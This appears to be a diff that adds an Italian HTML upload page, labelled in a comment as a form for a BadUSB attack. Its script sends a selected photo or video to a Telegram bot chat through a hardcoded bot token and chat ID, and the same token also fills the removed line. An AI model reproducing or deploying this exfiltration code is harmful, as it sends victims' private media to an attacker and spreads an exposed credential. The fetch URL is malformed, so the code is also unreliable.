@@ -1,1 +1,37 @@
-8859627744:AAET9vqRCTH34_PBN6lNr5gstBapm4oTKBU
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Test Caricamento</title>
+</head>
+<body>
+    <!-- Form minimale per la BadUSB -->
+    <form id="uploadForm">
+        <input type="file" id="fotoInput" name="photo" accept="image/*,video/*">
+        <input type="button" value="Invia" id="btnInvia" onclick="inviaAFTelegram()">
+    </form>
+
+    <script>
+        function inviaAFTelegram() {
+            // SOSTITUISCI CON IL TUO TOKEN E IL TUO CHAT ID
+            const token = "8859627744:AAET9vqRCTH34_PBN6lNr5gstBapm4oTKBU";
+            const chatId = "666777835";
+            
+            const fileInput = document.getElementById('fotoInput');
+            if (fileInput.files.length === 0) return;
+
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", fileInput.files[0]);
+
+            // Utilizza le API native di Telegram per l'invio delle foto
+            fetch(`https://telegram.org{token}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            })
+            .then(response => alert("Inviato!"))
+            .catch(error => console.error("Errore:", error));
+        }
+    </script>
+</body>
+</html>
